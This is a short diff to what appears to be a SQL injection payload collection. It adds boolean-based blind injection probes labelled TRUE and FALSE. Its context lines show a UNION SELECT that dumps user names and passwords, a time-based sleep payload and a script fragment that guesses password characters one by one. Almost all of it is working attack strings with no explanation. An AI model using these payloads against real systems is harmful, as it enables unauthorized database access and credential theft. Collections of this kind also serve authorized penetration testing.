@@ -320,6 +320,9 @@ uNiOn aLl sElEcT
 +union+select+1,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(user)WHERE(@x)IN(@x:=CONCAT(0x20,@x,user,0x203a3a20,pass,0x3c62723e))))x),3,4,5,6,7,8--+-
 0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z
 
+-1' OR 32<(1+2+4) or '4mEwSPwJ'=' => TRUE
+-1' OR 32>(1+2+4) or '4mEwSPwJ'=' => FALSE
+
 b"action=challenge&user=" + args.user.encode('utf-8') + b"' AND
 user_password LIKE \'" + temp_pass.encode('utf-8') + b"%' AND
 substr(user_password,1," + str(temp_pass_len).encode('utf-8') + b") = '" +
